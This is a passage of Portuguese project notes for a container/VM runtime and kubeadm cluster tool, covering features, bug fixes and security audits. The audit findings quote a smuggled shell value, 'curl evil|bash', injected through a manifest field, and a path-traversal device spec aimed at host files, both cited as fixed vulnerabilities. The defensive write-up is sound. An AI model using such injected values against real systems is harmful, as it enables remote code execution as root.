  (excepto exactamente 1, aceite para dev/teste com aviso alto de "sem HA"). **Achado não
  validado, contornado em vez de assumido**: não se confirmou se o `--upload-certs`/
  `--certificate-key` do kubeadm já redistribui o `apiserver-etcd-client` cert para CADA
  control-plane no caso externo (faz-o para o `stacked`); em vez de depender disso,
  `etcd::push_etcd_client_pki` reenvia `ca.crt`+`apiserver-etcd-client.{crt,key}` a CADA
  control-plane (o do `init` e cada `join --control-plane`) antes do respectivo comando kubeadm —
  a correcção fica independente do comportamento nativo do kubeadm; confirmar isso ao vivo é um
  follow-up, não bloqueia esta versão. CA+certos ficam em `<root>/clusters/<nome>/etcd/` (`0700`
  dir, `0600` ficheiros), a mesma convenção de subdirectório por-cluster que `id_ed25519` já usa.
  **Por fazer (deliberadamente fora desta versão)**: adicionar/remover membros depois do bootstrap,
  rotação de certificados, migrar um cluster `stacked` já vivo para `external`, e `mode: vm`
  (manifesto) auto-provisionar etcd — só o `cluster kubeadm --etcd-cluster` o faz por agora
  (`validate()` recusa `etcd.mode: external` fora de `mode: ssh` de propósito, para não descartar
  `etcd.hosts` em silêncio).
- **Preparação de host paralela entre hosts (v0.23.0)** — cada host é independente (sessão SSH
  própria, sem estado partilhado), corre agora em `std::thread::scope`. `kubeadm init`/`join`
  continuam sequenciais (dependem uns dos outros por desenho — o join precisa do token do init).
  Mudança de comportamento: ao contrário do loop antigo (parava no 1º host mau), agora TODOS os
  hosts são preparados e TODAS as falhas reportadas juntas.
- **HA multi-control-plane exige `spec.controlPlaneEndpoint` explícito** — kubeadm precisa de um
  endpoint estável (LB/VIP) à frente de vários control-planes; com 1 só, usa o IP dele.
- Sem teste end-to-end real nesta sessão — este sandbox não tem hosts SSH remotos. Validado até à
  fronteira real: parsing/validação do manifesto, resolução do `delonix-cri`, geração dos
  comandos `kubeadm init`/`join`, e a tentativa real de SSH falha correctamente e com clareza
  (`No route to host` num IP de teste) — não há mais nada para simular sem máquinas verdadeiras.

### `delonix cluster kubeadm [--name <n>] --control-plane <n> --workers <n>`

Camada por cima de `cluster apply` (pedido original, primeira sessão desta série: "um comando,
do zero a um cluster a funcionar"). Não escreve nem exige um `cloud.yaml` — provisiona as VMs e
constrói o `ClusterSpec` em memória, depois chama a MESMA `apply_one` que `cluster apply` usa
(zero duplicação da lógica kubeadm/SSH/validação de segurança — tudo em `cmd/cluster.rs`,
`ClusterCmd::Kubeadm`/`provision_and_apply`).

Fluxo: **resolve a imagem VM dourada** (`--vm-image` ou a única existente em
`VmImageStore` — erro claro se houver 0 ou mais de 1, nunca escolhe às cegas) → **gera ou
carrega uma chave SSH** (`--ssh-key`, ou `ssh-keygen -t ed25519` não-interactivo em
`<root>/clusters/<nome>/id_ed25519`) → **cria as VMs sequencialmente**
(`<nome>-cp1..N`/`<nome>-w1..M`, via `delonix_vm::create` com a imagem dourada como disco +
`cmd::vm::generate_seed_iso` para o cloud-init por-instância, reaproveitado tal-e-qual de
`delonix vm create --ssh-key`) → **espera cada VM ficar alcançável por SSH**
(`wait_for_vm_ssh_ready`: primeiro o IP via `delonix_vm::status`, depois um `ssh_check` real —
`--boot-timeout`, default 300s) → constrói o `ClusterSpec` (utilizador SSH sempre `delonix`, a
conta que a imagem dourada já cria) → `validate()` + `apply_one()` (mesmas defesas da auditoria
de segurança, herdadas automaticamente).

#### HA multi-control-plane: HAProxy automático (v0.13.0)

Com `--control-plane > 1`, provisiona automaticamente uma VM extra (`<nome>-lb`) a correr
**HAProxy** como load balancer TCP (L4, passthrough — a TLS do apiserver termina sempre no
control-plane real, nunca no LB) à frente da porta 6443 de cada control-plane, e usa o IP dessa
VM como `controlPlaneEndpoint` do `kubeadm init`/`join` — um único comando produz um cluster HA a
funcionar, sem flag nova (dispara sozinho a partir de `--control-plane > 1`). `delonix cluster
apply` continua a aceitar um `controlPlaneEndpoint` externo/manual para quem já tem o seu próprio LB.

Nada mudou a jusante: `kubeadm_init`/`kubeadm_join` já suportavam multi-control-plane
(`--control-plane-endpoint`/`--upload-certs`/`--certificate-key`) desde a v1 original — a única
lacuna era nunca termos nenhum endpoint real a apontar-lhes. Novo módulo `cmd/lb.rs`:
`build_haproxy_cfg` (função pura, testada) gera o `haproxy.cfg`; `ensure_haproxy` instala o
haproxy via apt se preciso, escreve a config (mesmo idioma de `prepare_host` para o
`delonix-cri`: tmpfile local → scp → `mv` privilegiado) e reinicia o serviço — sempre reescreve +
reinicia, idempotente-simples (mesmo compromisso já aceite no resto do `cluster apply`), seguro
em qualquer re-execução porque o HAProxy é um proxy L4 sem estado e a VM do LB já é idempotente
por nome (auto-heal, como qualquer outra VM deste cluster).

**Validado ao vivo (host kaeso-sys-01, 2026-07-24)**: `cluster kubeadm --control-plane 2 --workers
3` provisionou as 5 VMs + a `<nome>-lb` a correr HAProxy de ponta a ponta (`creating VM
ngolacloudlab-lb...` → `configuring HAProxy (192.168.122.26)...` → scp da config OK) — confirma o
caminho todo até ao ponto em que `apply_ssh` começa a preparar os hosts reais. Foi essa mesma
corrida que revelou o gap do `delonix-cri` corrigido a seguir.

#### `delonix-cri`/`delonix-cri.service` em falta fora de um checkout (v0.13.2)

Bug report real (mesma corrida acima): depois do LB configurado, `apply_ssh` falhava logo a
seguir com `não encontrei o binário delonix-cri: usa --cri-bin <caminho>, instala-o ao lado do
delonix, ou corre a partir do checkout do código-fonte` — o utilizador tinha instalado via
`install.sh` **sem** `--with-cri` (o default) e corria `cluster kubeadm` de fora de um checkout do
código-fonte, os dois únicos casos que `resolve_cri_bin` sabia resolver antes desta versão.

**Corrigido**, dois gaps da mesma família:

- `resolve_cri_bin`: quando não encontra o binário localmente, descarrega-o (verificado contra o
  `SHA256SUMS` da própria release, o mesmo não-negociável de qualquer download deste código) do
  release do GitHub que bate com a versão do PRÓPRIO `delonix` a correr — os dois publicam-se
  sempre juntos, na mesma tag. Cache em `<root>/bin/<versão>/delonix-cri`, um download por versão
  instalada. Detecta a variante `-v3` (AVX2/BMI2/FMA) com o mesmo critério do `install.sh`.
- `workspace_dist_file("delonix-cri.service")`: o unit systemd é estático e não depende de
  versão — passou a vir embutido no binário (`include_str!`) e é escrito para a mesma pasta de
  cache na primeira vez que falta, sem precisar de rede nenhuma.

Validado ao vivo com um binário isolado (sem `delonix-cri` ao lado, fora de qualquer checkout,
`DELONIX_ROOT` limpo) contra a v0.13.1 real publicada: descarrega, verifica, cacheia, e o
`cluster apply`/`cluster kubeadm` avançam até à fase real de preparação SSH dos hosts.

#### Progresso ao estilo `kind` (v0.14.0)

Pedido directo do utilizador: o log linha-a-linha (uma `println!` por VM criada, por recipe
aplicada, por host preparado) ficava verboso e pouco elegante num cluster de várias VMs — queria
o mesmo formato do `kind create cluster`. `cmd::kindmode.rs` já tinha exactamente esse mecanismo
(`output::Progress`, o próprio comentário do código já dizia "like kind/spinnies") — um spinner
braille por ETAPA lógica (não por VM/comando), que fecha com `✓`/`✗`. `provision_and_apply` e
`apply_ssh` passaram a usá-lo, cada um com a sua própria instância `Progress` (`apply_ssh` também
é chamado por `cluster apply -f`, que nunca passa por `provision_and_apply`):

```
info Creating cluster "ngolacloudlab" (kubeadm, 1.34)...
 ✓ Provisioning 2 control-plane(s) 📦
 ✓ Provisioning 3 worker(s) 📦
 ✓ Provisioning the HAProxy load balancer ⚖️
 ✓ Preparing 6 host(s) 🔧
 ✓ Bootstrapping control-plane (kubeadm init) 🕹️
 ✓ Joining 1 more control-plane(s) 🎮
 ✓ Joining 3 worker(s) 🚜
 ✓ Fetching kubeconfig 📇
```

Sem TTY (pipe/CI/`2>&1 | tee`), o `Progress` já degradava sozinho para uma linha por etapa SÓ
quando ela fecha (nada durante — é o que um log de CI quer) — validado ao vivo exactamente assim.
`create_and_wait`/`prepare_host`/`kubeadm_init`/`kubeadm_join` perderam os `println!` internos
(o passo exterior é que fala agora); os erros ganharam contexto explícito (`[{label}] {}: {e}`)
para não perder diagnóstico com o log granular removido. `ssh-keygen -q` tira o banner ruidoso da
geração da chave. `fetch_kubeconfig` passou a devolver o `PathBuf` em vez de imprimir por dentro —
as duas linhas finais úteis (`kubeconfig: ...`/`export KUBECONFIG=...`) imprimem-se depois do
último `✓`, fora do bloco de progresso, tal como o `kind` real também deixa um resumo no fim.

#### `--name` opcional + auto-pull de `--vm-image` em falta (v0.12.0)

Dois bugs reais (host kaeso-sys-01): (1) `--name` era obrigatório — sem a mesma analogia do nome
automático angolano (`<rei>-<lugar>-NN`) que containers e `cluster create` (modo kind) já têm;
(2) `--vm-image <v>`/`--k8s-version <v>` sem a imagem local dava sempre erro ("não tem qcow2 em
disco"), mesmo a golden sendo um artefacto OCI publicado precisamente para não precisar de
pull manual — e mesmo quando a imagem ESTAVA local mas só sob o nome de convenção completo
(`delonix-vm-k8s:1.34`), porque `resolve_vm_image` devolvia o valor explícito verbatim sem
verificar essa convenção primeiro.

**Corrigido**:

- `--name` passou a `Option<String>`; sem ele, `random_kubeadm_cluster_name` gera um nome livre
  no mesmo padrão (`super::names::random_name`, extraído do `kindmode::random_cluster_name` para
  ser partilhado pelos dois) — colisão verificada contra os nomes de VM existentes (um cluster
  kubeadm não tem registo próprio, É as suas VMs `<nome>-cp1`/`<nome>-w1`).
- `resolve_vm_image` agora prefere o nome de convenção local (`delonix-vm-k8s:<v>`) quando o
  valor explícito não bate certo com nenhuma imagem local por si só — fecha o caso de uma imagem
  já puxada por `vm pull` (que a guarda sob o nome completo) nunca ser encontrada por um
  `--vm-image` abreviado.
- Quando, mesmo assim, não há imagem local nenhuma, `provision_and_apply` já não desiste — chama
  `vmimage::cmd_pull` contra o repositório oficial (`official_pull_source`, mesma normalização:
  um valor com `/` usa-se tal-e-qual, um valor nu ou `delonix-vm-k8s:<v>` resolve contra
  `ghcr.io/angolardevops/delonix-vm-k8s:<v>`), sob o MESMO nome local que `resolve_vm_image` já
  tinha decidido — a chamada seguinte a `qcow2_path` encontra-a.

Validado ao vivo: `--vm-image 1.34` (já local, sob `delonix-vm-k8s:1.34`) resolve sem tentar
nenhum download; `--vm-image 1.35` (ausente) imprime "a descarregar de
'ghcr.io/angolardevops/delonix-vm-k8s:1.35'..." e inicia o pull real; sem `--name`, gera
`nzinga-cacuaco-19` e prossegue para a geração da chave SSH.

## Auditoria de segurança (skill `delonix-runtime-sec`)

Antes de estender `delonix cluster apply`, foi feita uma auditoria ofensiva dedicada (skill nova
`skills/delonix-runtime-sec/`, perfil de red-team especializado em runtimes de
containers/VMs) — 3 revisões adversariais em paralelo (injecção de comandos, escalada de
privilégio/fuga de namespace, memory safety + cadeia de fornecimento + path traversal).

**Veredicto da fronteira rootless→root**: sólida, nenhum CRÍTICO/ALTO. Socket de controlo do
holder valida `SO_PEERCRED` correctamente entre user namespaces; `join_netns` só recebe caminhos
gerados server-side (nunca input directo do CLI); mapeamento de uid não permite apontar para uid
0 real do host em nenhum dos 3 caminhos (root real/rootless single-uid/rootless com subuid).

**4 achados CRÍTICOS confirmados e CORRIGIDOS nesta mesma sessão** (todos em código novo desta
sessão, nunca tinham sido revistos adversarialmente):

1. **Injecção de comandos via manifesto `Cluster`** — `controlPlaneEndpoint`/`podSubnet`/
   `serviceSubnet`/`k8sVersion` entravam sem saneamento num `format!` que vira o CORPO de um
   `sudo -n bash -c` remoto (`cmd::cluster::kubeadm_init`/`kubeadm_join`). Um `cloud.yaml` com
   `controlPlaneEndpoint: "10.0.0.10; curl evil|bash; #"` era RCE como root no host de produção.
   **Corrigido**: `cmd::cluster::{valid_endpoint,valid_cidr,valid_version}` — whitelist estrita de
   caracteres, chamada em `validate()` antes de qualquer interpolação. `shell_quote` (`remote.rs`)
   só protege a fronteira ssh→bash-c local — nunca sanitiza o CONTEÚDO do comando; esta era a
   lição a reter (documentada nos comentários das funções `valid_*`).
2. **Mesmo vector via `k8sVersion` em `k8s_recipes::k8s_host_recipes`** (repositório apt,
   corrido em TODOS os hosts, incluindo antes do `kubeadm init`) — **corrigido** com a mesma
   validação, reaproveitada também em `vmimage::cmd_build` (`--k8s-version` tem o mesmo caminho).
3. **`pull_oci_artifact` não verificava o digest do blob recebido** contra o manifesto — um
   registo `ghcr.io` comprometido podia servir uma imagem VM dourada adulterada sem detecção.
   **Corrigido**: verificação `sha256(bytes) == digest_esperado` antes de devolver, mesmo padrão
   já usado por `pull_from_registry_with_creds` (que já estava correcto).
4. **Path traversal em `COPY` do `delonix build`** — `src`/`dst` de um Dockerfile/Delonixfile não
   eram confinados ao contexto/rootfs (`..` não neutralizado). **Corrigido**: `cmd::build::
   safe_join` (mesmo padrão de `safe_rel` em `delonix-image::overlay`), rejeita qualquer
   componente `..`/absoluto fora da base.

**2 achados BAIXOS, defesa em profundidade, também corrigidos**: `--` antes de `user@host` nos
argv de `ssh`/`scp` (`remote.rs`); `VmImageStore::base_cache_path` passou a usar `sanitize()`
como os outros métodos do store (`vmimage.rs`).

Todos os 4 CRÍTICOS têm teste automatizado a replicar o exploit e confirmar a rejeição (`cargo
test -p delonix-runtime-bin`/`-p delonix-image`) — ver `cmd::cluster::tests::
validate_recusa_endpoint_malicioso_no_manifesto_completo`,
`registry::tests::pull_oci_artifact_recusa_blob_adulterado`,
`cmd::build::tests::safe_join_recusa_dot_dot`.

## Revisão ampla de código/arquitectura (2026-07-27) — bugs reais corrigidos + dívida documentada

Pedido explícito do utilizador antes da publicação pública: revisão de código E arquitectura
(não só segurança) sobre TODO o repositório, com foco redobrado no código mais recente (dash/
métricas, `compose.rs`, a reorganização da CLI). 4 auditorias em paralelo — resumo em
`docs/COMPARACAO-DOCKER-PODMAN.md` não se aplica aqui (é específico do gap Docker/Podman); os
achados de arquitectura ficam registados nesta secção.

**7 bugs reais confirmados e CORRIGIDOS**:

1. **`compose.rs`: `depends_on: condition: service_completed_successfully` sem timeout** —
   `wait_for_condition` era um `loop {}` sem saída a não ser Ctrl-C se a dependência nunca saísse
   do estado Running (ex.: condição errada num serviço de longa duração, ou `restart:always` a
   reciclar de volta para Running). Corrigido com um tecto generoso (30 min) + heartbeat de
   progresso a cada 30s — nunca mais silenciosamente indistinguível de um hang.
2. **`compose.rs`: porta `host_ip:host:container` (ex.: `127.0.0.1:9000:80`) descartava o IP em
   silêncio** — **SUPERADO em 2026-07-27**, e esta entrada induziu em erro quem a leu depois (custou
   um check chumbado a 2026-08-15): o `parse_publish_addr`/`publish_bind_addr` da mesma série deu
   ao motor suporte REAL à forma `[hostIp:]hostPort:contPort`, por isso o compose **já não recusa,
   HONRA**. Medido: `ports: ["127.0.0.1:19099:80"]` → `container port` diz `127.0.0.1:19099` e o
   `ss` confirma o bind em loopback, sem nada em `0.0.0.0`. O que a bateria fixa hoje é o
   ENDEREÇO, não a recusa — um IP descartado voltaria a publicar em todas as interfaces, e é essa
   a regressão que importa apanhar. O texto original, para contexto histórico: — caía no caminho de 2 partes (`hostPort:containerPort`), publicando em TODAS as
   interfaces exactamente o oposto do que o ficheiro compose pedia (bind só a loopback). Corrigido
   para recusar explicitamente (o motor em si já recusa `-p 127.0.0.1:...` — `parse_publish` exige
   host_port só dígitos), consistente com a regra do próprio módulo de nunca degradar em silêncio.
3. **`compose.rs`: nomes `<projecto>_<chave>` de rede/volume podiam colidir entre projectos
   diferentes** — `format!("{project}_{key}")` não é livre de colisão (`project="a_b" key="c"` e
   `project="a" key="b_c"` davam ambos `"a_b_c"`); redes/volumes não têm campo de labels, por isso
   `compose down` recomputa o nome do zero — uma colisão fazia `down` de um projecto apagar o
   recurso de OUTRO. Corrigido com uma codificação livre de prefixo (`compose_scoped_name`: cada
   `_` literal em projecto/chave duplica-se antes da junção).
4. **`compose.rs`: `shlex_split` escapava backslash a mais dentro de aspas duplas** — POSIX só dá
   significado especial a backslash antes de cifrão, crase, aspas duplas, o próprio backslash, ou
   newline, dentro de `"…"`; qualquer outro carácter mantém o backslash. O parser tratava todos os
   backslashes da mesma forma, mudando em silêncio o argv de um comando com um padrão tipo
   `"grep \d+ ficheiro"`. Corrigido para seguir a regra POSIX exacta dentro de aspas duplas (fora
   delas, o comportamento — escapar o que vier a seguir, incondicionalmente — mantém-se).
5. **`firewall.rs`: TODOS os caminhos de mutação contornavam o `flock` do `Store`** — `ingress
   allow/deny/rm/clear`, `egress` equivalentes, `apply_container_ingress`, e o apply de manifesto
   faziam `store.load` → mutar em memória → `infra::apply_firewall` (kernel) → `store.save`, SEM
   nunca passar por `Store::update` (cujo próprio doc-comment diz que existe precisamente para
   sequenciar este read-modify-write entre processos). Corrida real: dois comandos de firewall
   contra o mesmo container (ou um comando de firewall a competir com uma reconciliação
   concorrente) aplicavam ambos no kernel com sucesso, mas só o último `save` sobrevivia no disco
   — a regra "perdedora" ficava viva no `nft` mas ausente do registo persistido, e desaparecia
   silenciosamente no próximo `container start` (que só reaplica o que está persistido). Corrigido
   com um novo `update_locked` (helper local que envolve `Store::update` para um closure que pode
   ele próprio falhar) — todos os 6 pontos de mutação agora passam pelo `flock`. Validado ao vivo
   (allow→deny→rm→policy→clear, ponta-a-ponta, estado persistido confere com o `nft` real).
6. **`peer_uid()` (extracção `SO_PEERCRED`) duplicado verbatim em 4 sítios** — `delonix-cri`,
   `delonix-mgmt`, `delonix-net::infra`, `cmd/dockerapi.rs`, os quatro já dependem de
   `delonix-runtime-core`, sem razão de fronteira de crate para a duplicação (ao contrário do
   `dir_size`, que genuinamente não pode ser partilhado sem dependência circular). Consolidado em
   `delonix_runtime_core::peer_cred::peer_uid` — um só sítio a partir de agora.
7. **Dashboard/métricas: nenhum timeout na colheita cara (rede+disco), e o total de tráfego
   contava silenciosamente um container `--net host/none` como "0 bytes"** — ver a secção "KPIs de
   recursos" acima para o detalhe completo dos dois achados e das correcções (`collect_with_timeout`
   com tecto de 120s + leak deliberado da thread presa em vez de um hang permanente; novo campo
   `network_unmeasured_containers` exposto no tile/JSON/gauge Prometheus em vez de somado como zero).

**3 achados de arquitectura documentados como dívida conhecida na revisão original — 2 FECHADOS
em 2026-07-27, 1 ainda aberto**:

- ✅ **FEITO — criação de rede já tem rollback em falha parcial.** `create_network` (bridge) fazia
  `store.create(name)?` (declarativo) e só DEPOIS `infra::network_create_with(...)?` (físico); se o
  segundo falhasse, o registo do primeiro ficava órfão — `network ls` mostrava a rede, nada
  conseguia anexar-se (`NotFound`), e um retry de `create` falhava com "already exists" até um
  `network rm` manual. Corrigido: se `network_create_with` falhar, o registo recém-criado é removido
  (`store.remove(name)`) antes de propagar o erro — uma `create` falhada não deixa nada para trás.
  Validado ao vivo o caminho feliz (inalterado); o caminho de falha não foi disparado ao vivo (exige
  forçar `infra::network_create_with` a falhar num host real), mas a lógica é uma reversão pura de
  store, sem risco de fronteira de privilégio. **`overlay` continua com a mesma limitação
  pré-existente** (a mensagem promete "reconcilia no próximo `network create`", mas
  `NetworkStore::create_overlay` não é idempotente) — fora do âmbito desta correcção, que só cobriu
  `bridge`.
- ✅ **FEITO — `JsonStore<T>` ganhou um `update` genérico, mesmo padrão do `Store<Container>`.**
  Novo `JsonStore::update` (lock por `flock`, re-lê sob o lock, aplica `f`, grava) — mesma forma de
  `Store::update`, generalizada por `T: Serialize + DeserializeOwned`. `delonix_vm::status()`
  (que fazia `load`→mutar(IP)→`save` sem lock nenhum, a correr concorrentemente com o refresh de
  métricas em background do dash/`delonix-mgmt` a par de `vm start/stop/create` da CLI) passou a
  usar `st.update(name, |vm| {...})` — a consulta ao backend (`is_running`/`ip`) e a decisão
  correm todas dentro da secção crítica. Teste de regressão puro por concorrência real
  (`jsonstore_update_concorrente_nao_perde_escritas`, mesmo padrão de threads +
  `sleep` a meio da janela de corrida que `update_concorrente_nao_perde_escritas` já usava para o
  `Store<Container>` irmão) — sem lock perderia escritas, com lock as 24 tiveram de bater certo.
  Validado ao vivo: `vm ls` (que chama `status()` para cada VM) continua a funcionar identicamente.
- **`spawn()` (`crates/delonix-runtime/src/lib.rs`) é uma função de ~405 linhas** — ainda aberto,
  cobrindo
  preparação de hostname/argv, setup de pty/socketpair, cálculo de flags de clone, o próprio
  `clone()`, um handshake de userns cuja correcção depende de uma ordem só documentada em
  comentários ("CRITICAL ORDER"), fork+detach do log shim, o hook de rede, setup de cgroup e
  `Store::save` — tudo numa função só. O tratamento de erros interno é cuidadoso, mas o tamanho é
  um risco real de manutenção (uma futura edição que reordene dois blocos pode reintroduzir um
  deadlock/corrida que os próprios comentários já documentam ter existido). Não é um bug ao vivo —
  é uma nota para quem for mexer ali a seguir.

### v0.32.1 — 3 achados durante o teste sistemático de todos os grupos de comandos

Continuação directa da revisão acima: testar ao vivo cada grupo/subcomando/parâmetro da CLI antes
da publicação (não só ler código) apanhou 3 problemas que a revisão estática não tinha visto.

1. **`secret create` não tinha via de stdin** — o próprio cheatsheet dos docs mostrava `printf
   's3nha' | delonix secret create db-pass` como forma seca de criar um segredo sem tocar no argv/
   histórico do shell, mas o comando só aceitava `--from-literal KEY=value`/`--from-env-file
   <ficheiro>` — o próprio exemplo documentado falhava com "segredo vazio". Corrigido:
   `--from-env-file -` lê de stdin (convenção `-`), mesmo parser `KEY=value` de um `.env` normal.
2. **`Error::NotFound` (partilhado por secrets/redes/volumes/imagens/...) dizia sempre "no such
   container: X"** — só `Store<Container>`'s dois call-sites dependiam da Display fixa; os outros
   stores já embutiam o prefixo certo na própria string. Um `secret rm <inexistente>` respondia
   literalmente "no such container: secret X". Corrigido na raiz (Display genérica `"no such
   {0}"` + os dois call-sites de `Store<Container>` a fornecer o prefixo deles) — validado ao vivo
   que `secret`/`volumes`/`network` passaram a nomear o recurso certo, e que `container
   rm`/`stop`/`net ingress ls` (via `firewall.rs`) não regrediram.
3. **`stack init` gerava um comentário desactualizado sobre `network:` em rootless** — dizia que
   tinha "uma limitação CONHECIDA... só funciona como root", uma nota de uma versão anterior a
   `reexec_into_netns` (ver secção "CLI" acima) ter fechado esse problema. Confirmado ao vivo
   (`container apply` com `network: <rede>` ganha IP real em rootless) e o comentário do scaffold
   corrigido para reflectir o estado actual — `--net host` continua o default do scaffold só por
   simplicidade, não porque `network:` esteja limitado.

### v0.32.2 — 380+ strings PT hardcoded fora do catálogo i18n, em 26 ficheiros

O achado nº2 acima (`manifest.rs`) era só a ponta: uma varredura completa (agentes em paralelo +
2ª passagem manual) encontrou a MESMA classe de bug — texto português hardcoded, visível mesmo em
EN por omissão — em `crates/delonix-runtime-bin/src/cmd/{build,cluster,conditions,container,
dependency,etcd,firewall,httproute,image,ingress_proxy,kindmode,kube,lb,manifest,mapped,network,
scaffold,scan,secret,sharevolume,stack,storage,system,tunnel,vm,vmimage,volume}.rs` — 380 strings
ao todo, movidas para `po::t`/`po::tf` + `pt.po` (352+ entradas novas). Duas armadilhas de
concordância de género apanhadas antes de corromper o catálogo (a mesma chave EN "created" já
existia traduzida como *criada* para "a rede" — reaproveitá-la para "o volume" teria produzido
*criada:* onde devia ser *criado:*; resolvido com chaves distintas por contexto, nunca partilhando
um `msgid` cujo `msgstr` dependa do género do sujeito). Aproveitado para corrigir 3 páginas da
doc pública desactualizadas (`docs/gen.py`): `serve docker-api` descrito como só-leitura (é
lifecycle completo desde v0.26.0), `cluster kubeadm` descrito sem suporte a HA (o HAProxy
automático existe desde v0.13.0), `network` descrito como só `bridge` realizado fisicamente (o
`overlay` também é, há várias versões) — e uma página inteira em falta (`delonix compose`, zero
documentação desde a v0.29.0). Validado ao vivo: build/clippy/fmt/test limpos, EN por omissão +
PT exacto via `--l18n=pt` em várias amostras, incluindo alinhamento de colunas independente por
língua no `volumes inspect`.

## Falhas silenciosas corrigidas (fail-closed) + 1 documentada

Da análise Docker/Podman (`docs/COMPARACAO-DOCKER-PODMAN.md`), quatro casos em
que uma opção era ACEITE e depois IGNORADA — pior que uma feature em falta,
porque o utilizador julga estar protegido. Três corrigidos para fail-closed
(erro/aviso explícito, alinhado ao invariante "sem falha silenciosa"):

1. **`--security-opt seccomp=<perfil.json>`** — perfil custom era ignorado (o
   container corria com o allowlist embutido). Passa a ERRO explícito: só
   `seccomp=unconfined` é suportado; perfis custom não estão implementados.
2. **`-v host:/dst:z|:Z|:U|<propagação>`** — o 3.º campo só reconhecia `ro`; as
   opções SELinux eram ignoradas e o bind falhava em RHEL/Fedora enforcing.
   Passa a ERRO: só `:ro`/`:rw` suportados (`resolve_spec`).
3. **`--network-alias`** — gravado mas o `dns_resolve` nunca o consultava.
   Passa a AVISO no `run` (implementar a resolução por alias é follow-up).

4. **`cpuset`/`cpu.weight`/`io.weight` no cgroup rootless-delegado** — `try_delegated_base`
   (`crates/delonix-runtime/src/lib.rs`) já activava `+cpuset`/`+io` no
   `subtree_control` da base delegada, mas nunca ESCREVIA `cpuset.cpus`/
   `cpu.weight`/`io.weight` na leaf — só `memory.max`/`pids.max`/`cpu.max`. O
   caminho não-delegado (root) já aplicava os três correctamente; o delegado
   (o modo NORMAL em rootless) não. **Corrigido**: os mesmos três `fs::write`
   best-effort do caminho root, agora também na leaf delegada. **Validado ao
   vivo neste host** (kaeso-sys-01, sessão sob `user@1000.service`): um
   `container run --cpu-weight 500` real confirmou `cpu.weight=500` na leaf
   real em `/sys/fs/cgroup/.../dlx-containers/dlx-<id>/cpu.weight` (o
   controlador `cpu` está delegado aqui). `cpuset`/`io` continuam por
   confirmar num host onde esses dois controladores estejam efectivamente
   delegados — **confirmado que este host NÃO os delega** (`systemd-run
   --user --scope -p Delegate=cpuset` só devolve `cpu memory pids`, mesmo
   pedindo `cpuset` explicitamente — limite do próprio `user@.service` da
   distro, não do código do delonix); o código escreve os ficheiros na
   mesma, best-effort, exactamente como o caminho root já fazia — sem
   controlador delegado o kernel simplesmente não cria `cpuset.cpus`/
   `io.weight` na leaf, e o `fs::write` falha silenciosamente aí (mesmo
   comportamento aceite no caminho root para o mesmo cenário). Teste de
   regressão puro (sem cgroupfs real): `try_delegated_base_aplica_cpu_weight_
   cpuset_e_io_weight_na_leaf`.
5. **`container update --memory/--cpus`** — **FEITO**. A função `runtime::
   update_limits` já existia no motor (rótulo próprio "`docker update`" no
   doc-comment) mas nunca tinha um único chamador — exactamente o mesmo padrão
   já visto com `mount_live`/`set_net_rate`: código morto por chamar, com um
   bug latente que só apareceu ao ligar o primeiro caller. **BUG ENCONTRADO E
   CORRIGIDO ao ligar isto**: `update_limits` calculava o cgroup por
   `container.cgroup()` — a fórmula ESTÁTICA `delonix.slice/delonix-<id>`, só
   válida em modo root. Em rootless delegado (o caminho normal), o cgroup real
   vive algures como `.../dlx-containers/dlx-<id>` (descoberto em runtime via
   `/proc/<pid>/cgroup`) — exactamente a razão de existir de `live_cgroup()`
   (já usada por `set_frozen`/`is_frozen` do `pause`/`unpause`), que
   `update_limits` simplesmente não usava. Resultado antes do fix: o comando
   dizia "actualizado", o registo mudava, mas o cgroup REAL do container a
   correr ficava intocado — só um `restart` (que recria o cgroup a partir do
   registo) aplicava o novo limite. Corrigido trocando `container.cgroup()`
   por `live_cgroup(container)` em `update_limits`. **Validado ao vivo**: `-m
   64M --cpus 0.5` → `update --memory 128M --cpus 1.0` → `memory.max`/`cpu.max`
   do cgroup REAL (sem `restart`) confirmam `134217728`/`100000 100000` de
   imediato. Sem teste unitário puro (ao contrário do fix irmão de cpuset/
   cpu.weight/io.weight): `DELONIX_SLICE` é uma constante de caminho absoluto,
   não injectável como o `base` de `try_delegated_base`, e `live_cgroup` lê
   `/proc/<pid>/cgroup` de um processo real — validação ao vivo é a prova
   disponível aqui, mesmo padrão já aceite noutras correcções de fronteira de
   cgroup/namespace nesta base de código.

## Auditoria de segurança #3 (2026-08-10) — as classes de CVE do mercado, 6 finders em paralelo

Pedido: rever a estrutura de segurança inteira contra os ataques críticos que Docker/K8s/runc/
CRI-O/Podman já sofreram. Seis auditorias adversariais em paralelo (escalada rootless→root e fuga
de namespace; injecção de comandos/argv; fuga de container por mounts/proc/sys/caps; memory safety
dos ~245 `unsafe`; cadeia de fornecimento e path traversal; isolamento de rede e segredos). **Zero
CRÍTICOS. 1 ALTO, 5 MÉDIOS, 7 BAIXOS — todos corrigidos nesta sessão**, cada um com teste de
regressão e, onde o caminho o permitia, validação ao vivo.

**Postura confirmada contra os ataques conhecidos** (lida no código, não deduzida): CVE-2019-5736
(o re-exec usa `current_exe()` do host, antes de qualquer rootfs), CVE-2024-21626 «Leaky Vessels»
(`close_range` nos forks, CLOEXEC, e o `chdir(workdir)` do `exec` corre já dentro do mnt-ns do
container), CVE-2022-0811 «cr8escape» (allowlist de sysctls + `/proc/sys` RO), CVE-2022-0492
(release_agent do cgroup v1 — **não aplicável**, o motor é v2-only), userns aninhado (`clone`
filtrado + `clone3`→ENOSYS *sempre* instalado), tar-slip, Shocker/`CAP_DAC_READ_SEARCH`.

**O que a auditoria encontrou de novo, e a lição de cada um:**

1. **ALTO — o digest-pinning era decorativo.** `pull …@sha256:X` verificava cada BLOB contra o que
   o manifesto declarava, mas nunca o MANIFESTO contra o digest pedido — um registo comprometido
   (ou um mirror/HTTP malicioso) devolvia um manifesto totalmente diferente, internamente
   consistente, e instalava o conteúdo do atacante sem um erro. É o mesmo threat model do achado
   CRÍTICO #3 de 2026-07 (blob-vs-manifesto), **um nível acima** — e é a razão de existir de um pin.
   `verify_manifest_digest` (`registry.rs`) nos dois caminhos de pull + no sub-manifesto multi-arch.
   Teste que **falha com a correcção revertida** (medido: sem ela o pull devolve uma `Image`).
2. **MÉDIO — `bind_devices` era o último caminho de bind sem confinamento.** Destino por
   concatenação crua + `File::create` (que TRUNCA): um `spec.devices: ["/dev/null:/../../etc/x"]`
   de um manifesto não-confiado escapava o rootfs e **truncava um ficheiro do host**. Dois finders
   independentes convergiram no mesmo sink. Passou a usar o `mount_target_safe`+`safe_bind_target`
   +`truncate(false)` que o `bind_volume` já usava a poucas linhas dali. Medido antes/depois: o
